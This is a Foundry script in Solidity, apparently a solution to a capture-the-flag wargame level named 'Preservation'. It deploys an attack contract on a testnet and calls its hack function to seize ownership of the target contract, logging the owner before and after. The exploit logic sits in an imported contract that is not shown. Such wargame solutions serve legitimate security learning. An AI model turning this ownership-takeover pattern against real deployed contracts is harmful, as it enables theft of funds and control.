// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {IPreservation} from "src/hack/interfaces/IPreservation.sol";
import {PreservationHack} from "src/hack/PreservationHack.sol";

contract PreservationScript is Script {
    error HackFailed();

    function run() external {
        address attacker = vm.rememberKey(vm.envUint("TESTNET_PRIVATE_KEY_1"));
        address preservationAddr = vm.envAddress("PRESERVATION_ADDRESS");

        console2.log("Old owner : ", IPreservation(preservationAddr).owner());

        vm.startBroadcast(attacker);
        PreservationHack preservationHack = new PreservationHack();
        preservationHack.hack(preservationAddr);

        console2.log("New owner : ", IPreservation(preservationAddr).owner());

        console2.log("SUCCESS!!! Submit the instance.");
        vm.stopBroadcast();
    }
}
